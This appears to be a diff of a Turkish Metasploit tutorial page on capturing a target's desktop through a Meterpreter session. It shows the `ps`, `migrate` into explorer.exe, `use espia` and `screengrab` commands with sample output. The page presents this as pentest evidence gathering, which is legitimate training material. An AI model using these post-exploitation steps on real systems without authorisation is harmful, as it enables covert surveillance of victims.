@@ -1,37 +1,28 @@
 ---
 draft: false
-
-title:  'MSF Ekran Yakalama'
-date: '2017-06-05T13:38:00+03:00'
+title: MSF Ekran Yakalama
+linkTitle: Ekran Yakalama
+translationKey: msf-screenshot
+date: 2017-06-05T13:38:00+03:00
+weight: 250
 author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
-
-description:  'Meterpreter shell oturumunun sağladığı imkanlardan bir tanesi de hedef bilgisayarın Masaüstü görüntüsünü kaydedebilmektir. Bu yöntemle Masaüstü görüntüsü alma, genellikle pentest işlemlerinde ispat olarak kullanılır.' 
- 
-url:  /tr/msf-ekran-yakalama/
- 
+description: Meterpreter shell oturumunun sağladığı imkanlardan bir tanesi de hedef bilgisayarın Masaüstü görüntüsünü kaydedebilmektir. Bu yöntemle Masaüstü görüntüsü alma, genellikle pentest işlemlerinde ispat olarak kullanılır.
+url: /tr/msf-ekran-yakalama/
 featured_image: /images/metasploit.jpg
 categories:
-    - 'Metasploit Framework'
+  - Metasploit Framework
 tags:
-    - cybersecurity
-    - 'metasploit framework'
+  - cybersecurity
+  - metasploit
+  - framework
 ---
-
-
 ## Ekran Yakalama
-
-
 
 Meterpreter shell oturumunun sağladığı imkanlardan bir tanesi de hedef bilgisayarın Masaüstü görüntüsünü kaydedebilmektir. Bu yöntemle Masaüstü görüntüsü alma, genellikle pentest işlemlerinde ispat olarak kullanılır.
 
-
-
 Meterpreter oturum açtığınızda, oturumu `explorer.exe` prosesine taşınmalısınız. Aşağıdaki örnekte öncelikle sistemde çalışan programlar kontrol edilmektedir.
 
-
-
 Hedef bilgisayarda meterpreter oturum açtığınızı farz ediyoruz. Öncelikle çalışan işlemlere bakalım. Bunun için `ps` komutunu kullanabilirsiniz.
-
 
 ```bash
 > Started bind handler
@@ -42,7 +33,7 @@ Hedef bilgisayarda meterpreter oturum açtığınızı farz ediyoruz. Öncelikle
 meterpreter > ps
 
 Process list
-**============**
+============
 
     PID   Name                 Path
     ---   ----                 ----
@@ -79,10 +70,7 @@ Process list
     3004  cmd.exe              C:\WINDOWS\system32\cmd.exe
 ```
 
-
-
 Örnek çıktıda görüldüğü gibi `explorer.exe` 260 PID numarasıyla çalışmaktadır. `migrate` komutuyla Meterpreter oturumunu `explorer.exe` içine taşıyalım.
-
 
 ```bash
 meterpreter > migrate 260
@@ -90,27 +78,19 @@ meterpreter > migrate 260
 > Migration completed successfully.
 ```
 
-
-
 Ardından `espia` eklentisini aktif hale getirelim.
-
 
 ```bash
 meterpreter > use espia
 Loading extension espia...success.
 ```
 
-
-
 `screengrab` komutuyla hedef bilgisayarın Masaüstü görüntüsünü kaydedelim.
-
 
 ```bash
 meterpreter > screengrab
 Screenshot saved to: /root/nYdRUppb.jpeg
 meterpreter >
 ```
-
-
 
 Gördüğünüz gibi Masaüstü resmi yerel bilgisayarımıza kaydedildi. Bu işlemi yaparken `explorer.exe` veya benzeri şekilde klasör ve dosyalar üzerinde işlem yapabilen bir programa geçiş yapmanız önemlidir. Aksi takdirde `screengrab` komutu çalışmayabilir.
